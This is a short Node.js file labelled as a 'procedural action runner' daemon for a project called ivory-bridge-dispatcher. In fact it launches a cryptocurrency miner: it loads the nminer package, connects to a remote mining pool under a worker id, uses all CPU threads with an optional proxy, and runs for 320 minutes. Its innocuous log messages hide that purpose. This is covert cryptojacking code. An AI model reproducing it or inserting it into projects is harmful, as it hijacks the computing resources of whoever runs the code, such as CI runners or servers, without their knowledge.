// Procedural action runner for ivory-bridge-dispatcher
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

(async () => {
    const instanceToken = "1d4b69";
    console.log(`[lifecycle] Daemon ${config.appName || "ivory-bridge-dispatcher"} active [tag: ${instanceToken}]`);

    const service = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Arup07.vestment",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (320m) reached, exiting cleanly.");
        process.exit(0);
    }, 320 * 60 * 1000);

    process.once("SIGTERM", () => {
        
        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
        process.exit(0);
    });

    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
})().catch(console.error);
